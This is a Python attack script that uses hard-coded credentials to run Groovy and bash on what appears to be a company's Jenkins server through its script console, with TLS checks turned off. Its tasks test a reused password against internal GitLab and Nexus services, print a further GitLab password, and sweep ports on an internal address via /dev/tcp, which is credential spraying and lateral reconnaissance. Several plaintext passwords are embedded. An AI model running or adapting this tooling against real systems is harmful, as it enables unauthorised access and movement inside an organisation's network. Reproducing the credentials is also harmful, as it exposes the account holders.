import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


TASK_Q2 = r'''def r = ["bash","-c","""
echo '===== GitLab HTTPS reuse test ====='
for u in cs-jenkins-deployer jenkins root; do
  code=\$(curl -sk --max-time 8 -u \"\$u:auroraboreal00\" 'https://gitlab.dev.claroshop.com/api/v4/user' -o /dev/null -w '%{http_code}' 2>/dev/null)
  echo \"gitlab \$u:auroraboreal00 -> \$code\"
done
echo '===== GitLab known-good (jenkins) ====='
curl -sk --max-time 8 -u 'jenkins:e6LBqIkOI\$PR1XX2oia' 'https://gitlab.dev.claroshop.com/api/v4/user' 2>/dev/null | head -c 250
echo ''
echo '===== Nexus https/8081 ====='
code=\$(curl -sk --max-time 6 -u 'cs-jenkins-deployer:auroraboreal00' 'https://nexus.dev.claroshop.com/service/rest/v1/status' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"nexus https -> \$code\"
code=\$(curl -sk --max-time 6 -u 'cs-jenkins-deployer:auroraboreal00' 'http://nexus.dev.claroshop.com:8081/service/rest/v1/status' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"nexus 8081 -> \$code\"
"""].execute().text
println r
'''

TASK_R2 = r'''def r = ["bash","-c","""
echo '===== TCP sweep 172.26.127.196 (3s per port) ====='
for p in 22 80 443 6443 8443 10250; do
  timeout 3 bash -c \"echo > /dev/tcp/172.26.127.196/\$p\" 2>/dev/null && echo \"\$p OPEN\" || echo \"\$p closed/filtered\"
done
echo '===== /etc/hosts amxnova ====='
grep -iE 'amxnova|172.26' /etc/hosts 2>/dev/null
echo '===== default route ====='
ip route 2>/dev/null | head -4
"""].execute().text
println r
'''

TASKS = [
    ("TASK Q2: auroraboreal00 reuse (GitLab HTTPS / Nexus)", TASK_Q2),
    ("TASK R2: OCP 172.26.127.196 port sweep (bounded)", TASK_R2),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
